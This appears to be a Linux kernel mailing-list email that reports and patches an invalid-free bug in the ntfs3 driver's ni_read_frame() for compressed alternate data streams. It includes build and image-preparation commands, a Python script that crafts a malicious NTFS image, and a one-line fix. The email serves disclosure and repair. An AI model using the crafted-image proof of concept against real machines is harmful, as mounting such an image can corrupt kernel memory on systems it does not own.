Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=220.197.31.5
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792456516;
	b=bGF2+f78vIWynkmFBGRCUfFGJ2UMoldIK+RLQ6/MCozWWytlyOqMhH448iFrD6JfioU5
	 295HBY+Ly7zHFW4S331U39XuTYJpOptKSau7UiqEZJiI8pp7dDcLp8Xmwx4cFZS+Y5OXs
	 xCw9a6gwIjd9izCwKmK4t4u0cGQLvSmC3PmamalPfI3PtebpAUW8NLKzXCu9R2wYufC9h
	 WEilTAHzVGIJU0kEe7VyaMbvuOmMr0/makC19FHkxsgiCykJlQktCkh/oV+moPtcWYglL
	 Rel7wK+ju8e1KxloMhRmYq787OmcTzsDRlCUeCIBzbG8QiQXgD4APtyvyowk+s511Zw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792456516;
	h=DMARC-Filter:DKIM-Signature:Received:From:To:Cc:Subject:Date:
	 Message-Id:X-Mailer:MIME-Version:Content-Transfer-Encoding:
	 X-CM-TRANSID:X-Coremail-Antispam:X-CM-SenderInfo;
	bh=v/QIFBOq4Nj5UbBI7+1Y8y9OTv6KINWJIeF08+43a70=;
	b=xt0QhyQh4WPIcQx0EjaZSHxNFz/ilZFH04Se3QUBh2hAPdrwi7xpRBVXL/DS3uOwALSB
	 FznDdxQAf+IrRjtcxRQ6wE5nVR8KQ6NAIqHwmwc5f0WJl8PvgBfwxKZ/vC4auO2m8oPtJ
	 AWBtOpXz/k1s/quMDB1dAowwZVlIde5XWsPs6hxKiIcTpVgm9wQJ44eaUk8sroP4W/EFF
	 7IHcH6XJZWuS15/RtJoi6LzjX75Oym0nHicghCv5aLoGFqxFKYCOVPgxPpOXZfEQULNqd
	 gsYYuS2sjBOUqNrlaAxpamvtH6RR7Ey97CHqtbnhOMDoTr32fH0THIusRBdmPqtqBFQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=163.com;
	spf=pass smtp.mailfrom=163.com;
	dkim=pass header.d=163.com header.i=@163.com header.a=rsa-sha256 header.s=s110527 header.b=OrnC3YS9;
	arc=none smtp.remote-ip=220.197.31.5
Received: from m16.mail.163.com (m16.mail.163.com [220.197.31.5])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 619A8606A319
	for <ntfs3@lists.linux.dev>; Tue, 20 Oct 2026 00:35:15 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 619A8606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=163.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key, unprotected) header.d=163.com header.i=@163.com header.a=rsa-sha256 header.s=s110527 header.b=OrnC3YS9
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
	s=s110527; h=From:To:Subject:Date:Message-Id:MIME-Version; bh=v/
	QIFBOq4Nj5UbBI7+1Y8y9OTv6KINWJIeF08+43a70=; b=OrnC3YS9OnENTVKZyH
	VDQq7X0uT2KQSnJ8ljnAJSiWusVd/G0Mu2B5UIroEdqmxsBZo/3vkajb4+femizH
	ibcjfBUAKM4l5YilDSgBsxJmXBY6eztPkgxdUVmEv/wwVa+d7DuTckIuH+b9cy2d
	NRk0r8SxCLNsxr+msLVxYiK9U=
Received: from shaos.localdomain (unknown [])
	by gzga-smtp-mtada-g1-4 (Coremail) with SMTP id _____wDnTyM6t9Zqd1hEBA--.28269S2;
	Tue, 20 Oct 2026 08:35:06 +0800 (CST)
From: shaos <shawnq1@163.com>
To: almaz.alexandrovich@paragon-software.com
Cc: ntfs3@lists.linux.dev,
	linux-kernel@vger.kernel.org
Subject: [PATCH] fs/ntfs3: keep the ADS run tree when reading compressed streams
Date: Tue, 20 Oct 2026 00:35:06 +0000
Message-Id: <20261020003506.1010276-1-shawnq1@163.com>
X-Mailer: git-send-email 2.34.1
X-Mailing-List: ntfs3@lists.linux.dev
List-Id: <ntfs3.lists.linux.dev>
List-Post: <mailto:ntfs3@lists.linux.dev>
List-Help: <mailto:ntfs3+help@lists.linux.dev>
List-Subscribe: <mailto:ntfs3+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:ntfs3+unsubscribe@lists.linux.dev>
List-Owner: <mailto:ntfs3+owner@lists.linux.dev>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:_____wDnTyM6t9Zqd1hEBA--.28269S2
X-Coremail-Antispam: 1Uf129KBjvJXoW3Kr43Ww43KryrWF4rKFyrCrg_yoWDWFWkpa
	y3Zw4Iyw4fXF10qw4DG3W8u34fKwnxGw15GFs8Z34rCF9Ikr4vyFy8try8uFW5tr98Wa4x
	Xw4qga1xtFyDtaUanT9S1TB71UUUUU7qnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
	9KBjDUYxBIdaVFxhVjvjDU0xZFpf9x07UlksgUUUUU=
X-CM-SenderInfo: pvkd40jtr6il2tof0z/xtbC8RpMWmrWtzo+hgAA30

Hello,

ni_read_frame() saves a pointer to the stream inode's embedded file.run tree and then changes ni to ni->base.  The cleanup compares that pointer with the base inode's run tree and calls run_free() on the still-live stream inode member.  Reading a compressed named $DATA stream therefore produces a KASAN invalid-free in the normal NTFS3 read path.

HEAD commit:    fe2ec83746e501645709761605c2464a44fd2929
git tree:       upstream Linux checkout, local branch master
source version: Linux 7.3.0-rc4-70-gfe2ec83746e50
compiler:       gcc 11.4.0, GNU ld 2.38 (from the kernel build banner)

console output:
https://gist.githubusercontent.com/shaos26/e66aded6793e16ac4e56185cea3533de/raw/7d1e782356e9104f55bd6d08876f121c92ba59ae/console-output.txt
kernel config:
https://gist.githubusercontent.com/shaos26/e66aded6793e16ac4e56185cea3533de/raw/e47da1b0ca0ffe6d0ac3a988e2c30c7eb634ede3/kernel-config.txt
reproducer:
https://gist.githubusercontent.com/shaos26/e66aded6793e16ac4e56185cea3533de/raw/d32903403be7b958ee0b52c5ea417ac674e9eb09/poc.c

Build the kernel from HEAD with the attached config, then create a compressed ADS image and a minimal initramfs.  The following commands use ntfs-3g tools mkntfs and ntfscp:

    mkdir -p build run/rootfs
    cp kernel-config.txt build/.config
    make O=build olddefconfig
    make O=build -j"$(nproc)" bzImage
    dd if=/dev/zero of=run/base.img bs=1M count=64 status=none
    mkntfs -F -q -L vulntest -c 4096 -s 512 run/base.img
    printf 'HELLO-BASE-DATA-' > run/base.txt
    ntfscp -q -f run/base.img run/base.txt victim
    printf 'CONTROL-ADS-DATA' > run/ads2.txt
    ntfscp -q -f -N ads2 run/base.img run/ads2.txt victim
    printf 'ATTACK-ADS-DATA' > run/ads1.txt
    ntfscp -q -f -N ads1 run/base.img run/ads1.txt victim

Save the following source as craft_image.py, then run it on run/base.img to produce run/crafted.img.  It sets the COMPRESSED flag on only the ads1 $DATA attribute and repairs the MFT update-sequence fixups.

--- craft_image.py ---
#!/usr/bin/env python3
# Craft an NTFS image exercising fs/ntfs3 ni_read_frame() ADS run-tree mis-ownership.
# Input : base.img  (mkntfs + ntfscp-created "victim" file with ADS "ads1"/"ads2")
# Output: crafted.img with the "$DATA:ads1" attribute's COMPRESSED flag set.
import struct, sys, shutil

SRC = sys.argv[1] if len(sys.argv) > 1 else "base.img"
DST = sys.argv[2] if len(sys.argv) > 2 else "crafted.img"

img = bytearray(open(SRC, "rb").read())

sect_size = struct.unpack_from("<H", img, 0x0B)[0]
sect_per_cl = img[0x0D]
cl_size = sect_size * sect_per_cl
mft_lcn = struct.unpack_from("<Q", img, 0x30)[0]
cpr = struct.unpack_from("<b", img, 0x40)[0]
rec_size = 1 << (-cpr) if cpr < 0 else cpr * cl_size
print(f"[*] sector={sect_size} cluster={cl_size} mft_lcn={mft_lcn} rec_size={rec_size}")

def read_runs(attr, base_off):
    """parse a non-resident attribute's run list -> list of (vcn_start, lcn)"""
    run_off = struct.unpack_from("<H", attr, 0x20)[0]
    p = base_off + run_off
    end = base_off + len(attr)
    vcn = 0
    runs = []
    while p < end:
        hdr = attr[p - base_off]
        p += 1
        if hdr == 0:
            break
        ls, os = hdr & 0xF, hdr >> 4
        ln = int.from_bytes(attr[p - base_off:p - base_off + ls], "little"); p += ls
        if os == 0:
            lcn = None
        else:
            off = int.from_bytes(attr[p - base_off:p - base_off + os], "little", signed=True); p += os
            lcn = (runs[-1][1] if runs and runs[-1][1] is not None else 0) + off if False else None
        runs.append([vcn, ln, None])
        vcn += ln
    # second pass with proper deltas
    p = base_off + run_off
    prev = 0
    runs = []
    vcn = 0
    while p < end:
        hdr = img[p]; p += 1
        if hdr == 0:
            break
        ls, os = hdr & 0xF, hdr >> 4
        ln = int.from_bytes(img[p:p + ls], "little"); p += ls
        if os == 0:
            lcn = None
        else:
            off = int.from_bytes(img[p:p + os], "little", signed=True); p += os
            prev = prev + off
            lcn = prev
        runs.append((vcn, ln, lcn))
        vcn += ln
    return runs

def record_off(rno):
    """physical byte offset of MFT record rno, via $MFT $DATA runlist"""
    byte_off = rno * rec_size
    cl = byte_off // cl_size
    within = byte_off % cl_size
    for vcn, ln, lcn in mft_runs:
        if vcn <= cl < vcn + ln:
            assert lcn is not None, "sparse $MFT"
            return lcn * cl_size + (cl - vcn) * cl_size + within
    raise SystemExit(f"record {rno} outside $MFT runlist")

# --- parse MFT record 0 to obtain $MFT runlist -------------------------------
r0 = mft_lcn * cl_size
rec0 = img[r0:r0 + rec_size]
usa_off, usa_cnt = struct.unpack_from("<HH", rec0, 4)
def unfix(rec):
    rec = bytearray(rec)
    for i in range(1, usa_cnt):
        se = i * sect_size - 2
        rec[se:se + 2] = rec[usa_off + 2 * i: usa_off + 2 * i + 2]
    return rec
rec0c = unfix(rec0)
assert rec0c[0:4] == b"FILE"
attr_off = struct.unpack_from("<H", rec0c, 0x14)[0]
used = struct.unpack_from("<I", rec0c, 0x18)[0]
mft_runs = None
o = attr_off
while o + 8 <= used:
    t, sz = struct.unpack_from("<II", rec0c, o)
    if t == 0xFFFFFFFF:
        break
    if t == 0x80 and rec0c[o + 8] == 1 and rec0c[o + 9] == 0:
        mft_runs = read_runs(rec0c[o:o + sz], r0 + o)
    o += sz
assert mft_runs, "no $MFT runlist"
print(f"[*] $MFT runs (vcn,len,lcn): {mft_runs[:8]}{'...' if len(mft_runs) > 8 else ''}")

# --- find the record holding the base file by scanning for its $FILE_NAME ----
def find_victim(name="victim"):
    for rno in range(24, 256):
        try:
            off = record_off(rno)
        except SystemExit:
            break
        rec = img[off:off + rec_size]
        if rec[0:4] != b"FILE":
            continue
        rc = unfix(rec)
        aoff = struct.unpack_from("<H", rc, 0x14)[0]
        use = struct.unpack_from("<I", rc, 0x18)[0]
        o = aoff
        while o + 8 <= use:
            t, sz = struct.unpack_from("<II", rc, o)
            if t == 0xFFFFFFFF:
                break
            if t == 0x30 and rc[o + 9] == 0:  # $FILE_NAME (unnamed attr)
                do = struct.unpack_from("<H", rc, o + 0x14)[0]  # resident data_off
                nlen = rc[o + do + 0x40]
                ns = rc[o + do + 0x41]
                nm = rc[o + do + 0x42:o + do + 0x42 + 2 * nlen].decode("utf-16-le", "replace")
                if nm == name and ns != 2:  # skip DOS namespace
                    return rno, off, rc
            o += sz
    raise SystemExit("victim record not found")

rno, roff, rec = find_victim()
print(f"[*] victim in MFT record {rno} @ file offset {roff:#x}")

aoff = struct.unpack_from("<H", rec, 0x14)[0]
use = struct.unpack_from("<I", rec, 0x18)[0]
o = aoff
patched = 0
while o + 8 <= use:
    t, sz = struct.unpack_from("<II", rec, o)
    if t == 0xFFFFFFFF:
        break
    if t == 0x80 and rec[o + 9]:
        nlen = rec[o + 9]
        noff = struct.unpack_from("<H", rec, o + 0x0A)[0]
        nm = rec[o + noff:o + noff + 2 * nlen].decode("utf-16-le", "replace")
        if nm == "ads1":
            fl = struct.unpack_from("<H", rec, o + 0x0C)[0]
            print(f"[*] $DATA:{nm} at record off {o:#x} size={sz:#x} non_res={rec[o+8]} "
                  f"flags={fl:#06x} data_size={struct.unpack_from('<I', rec, o+0x10)[0]}")
            rec[o + 0x0C:o + 0x0E] = struct.pack("<H", fl | 0x0001)
            patched += 1
        elif nm == "ads2":
            fl = struct.unpack_from("<H", rec, o + 0x0C)[0]
            print(f"[*] $DATA:{nm} at record off {o:#x} size={sz:#x} non_res={rec[o+8]} "
                  f"flags={fl:#06x} data_size={struct.unpack_from('<I', rec, o+0x10)[0]} (control, unpatched)")
    o += sz
assert patched == 1, f"expected exactly one ads1 attr, patched={patched}"

# --- re-apply fixups and write back -----------------------------------------
usn = rec[usa_off:usa_off + 2]
for i in range(1, usa_cnt):
    se = i * sect_size - 2
    rec[usa_off + 2 * i: usa_off + 2 * i + 2] = rec[se:se + 2]
    rec[se:se + 2] = usn
img[roff:roff + rec_size] = rec

open(DST, "wb").write(img)
print(f"[+] wrote {DST}")

# --- verify by re-reading ----------------------------------------------------
chk = bytearray(open(DST, "rb").read())[roff:roff + rec_size]
chk = unfix(chk)
o = aoff
while o + 8 <= use:
    t, sz = struct.unpack_from("<II", chk, o)
    if t == 0xFFFFFFFF:
        break
    if t == 0x80 and chk[o + 9]:
        nlen = chk[o + 9]
        noff = struct.unpack_from("<H", chk, o + 0x0A)[0]
        nm = chk[o + noff:o + noff + 2 * nlen].decode("utf-16-le", "replace")
        print(f"[v] $DATA:{nm} flags={struct.unpack_from('<H', chk, o + 0x0C)[0]:#06x}")
    o += sz
--- end craft_image.py ---

Build the guest trigger and boot it with the image attached as /dev/vda:

    cc -static -O2 -Wall -Wextra -o poc poc.c
    cp poc run/rootfs/init
    (cd run/rootfs && find init | cpio -o -H newc --owner=0:0) | gzip -9 > run/initramfs.cpio.gz
    timeout 900 qemu-system-x86_64 -kernel build/arch/x86/boot/bzImage \
        -initrd run/initramfs.cpio.gz \
        -drive file=run/crafted.img,if=virtio,format=raw,snapshot=on \
        -append "console=ttyS0 rdinit=/init panic=-1 loglevel=4" \
        -nographic -m 4096 -smp 2 -no-reboot 2>&1 | tee run/run.log

Two fresh crafted images triggered the same KASAN invalid-free at ni_read_frame(): the freed address was offset 0x1c8 inside a live 1680-byte ntfs_inode_cache object.  A fix-control kernel that moved the run assignment after ni = ni->base completed the read cleanly; an uncompressed ADS control also completed without the report.

Impact and prerequisites:
Mounting an attacker-controlled NTFS image is required and normally requires a privileged mount.  KASAN reports a deterministic kernel bug; without KASAN, freeing an interior pointer to a live inode can corrupt slab state.  No privilege escalation or code execution has been demonstrated.

Move the run-tree pointer assignment until after the inode has been redirected to its base record:

diff --git a/fs/ntfs3/frecord.c b/fs/ntfs3/frecord.c
--- a/fs/ntfs3/frecord.c
+++ b/fs/ntfs3/frecord.c
@@ -2282,7 +2282,7 @@
 	char *frame_ondisk = NULL;
 	char *frame_mem = NULL;
 	struct ATTR_LIST_ENTRY *le = NULL;
-	struct runs_tree *run = &ni->file.run;
+	struct runs_tree *run;
 	u64 valid_size = ni->i_valid;
 	u64 vbo_disk;
 	size_t unc_size = 0;
@@ -2292,6 +2292,7 @@
 	CLST frame, clst_data;
 
 	ni = ni->base;
+	run = &ni->file.run;
 	/*
 	 * To simplify decompress algorithm do vmap for source
 	 * and target pages.

Fixes: be310476e8868 ("fs/ntfs3: Add basic support for alternative data streams")
Signed-off-by: shaos <shawnq1@163.com>

Validation: Unfixed kernel: same KASAN invalid-free on two fresh images.  Fix-control kernel: one clean run.  The report PoC is the guest trigger; image preparation requires the separate mutator noted above.

Thanks,

shaos

